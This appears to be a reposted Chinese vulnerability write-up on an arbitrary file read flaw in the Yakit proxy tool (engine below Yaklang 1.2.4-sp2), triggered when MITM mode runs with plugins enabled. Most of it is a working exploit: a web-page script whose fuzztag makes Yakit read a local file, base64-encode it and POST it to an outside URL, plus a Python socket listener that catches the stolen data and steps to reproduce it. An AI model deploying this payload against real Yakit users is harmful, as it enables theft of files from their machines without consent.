详情可参考原文 有截图复现
原文链接：https://mp.weixin.qq.com/s/IQekVs-UU2Slh6V_frpaug


前言：
yakit是近年新兴的一个BurpSuite平替工具，和burp的区别就在于数据包放过去不用配置ip端口协议这些，但是yakit跑起来感觉卡卡的，远不如burp那么流畅，近期yakit爆出了一个任意文件读取漏洞，此漏洞通过在网页嵌入js代码实现读取yakit使用者设备上的文件
触发版本：
引擎版本< Yaklang 1.2.4-sp2
漏洞条件：
使用yakit的MITM代理并且启用任意插件

Pyload:
<script>
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "http://yakit.com/filesubmit");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send(`file={{base64enc(file(C:\\Windows\\System32\\drivers\\etc\\hosts))}}`);
</script>
```
监听脚本
#! /bin/python3
import socket

# 监听地址和端口

host = '0.0.0.0'
port = 23800

# 创建socket服务器

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# 绑定并监听端口

server.bind((host, port))
server.listen()

# 接收连接并监听请求

print("Listening...")
while True:
    # 接收客户端连接请求
    client, address = server.accept()
    print(f"Connected by {address}")

    # 读取客户端请求数据
    request = ''
    while True:
        input_data = client.recv(1024).decode('utf-8')
        request += input_data
        if len(input_data) < 1024:
            break
    
    # 提取请求头部
    headers = request.split('\n')
    print("Received headers:")
    for header in headers:
        print(header)
    
    # 关闭客户端连接
    client.close()


```




复现开始：
创建一个html页面并插入payload

启用MITM代理，不启用插件进行访问：
https://mmbiz.qpic.cn/sz_mmbiz_png/OF9Ieq8TATc71LlcBt5FGOn2ibomGw7wMXX7dh9j86aZ7JA0WMoxwHSDdAwnMVSZLoF09zuiamTpkibBtLto8y8KA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1
启用MITM代理并启用插件进行访问：
https://mmbiz.qpic.cn/sz_mmbiz_png/OF9Ieq8TATc71LlcBt5FGOn2ibomGw7wM1RvwO5nnYhpX3aKZeCDdziaCEcOSDfbIcu2wNe27x7aTsPgBXo8KTsQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1


原理：yakit默认不会对经过MITM代理的流量中的fuzztag进行解析，但是经过插件时会被解析，所以这也是利用限制。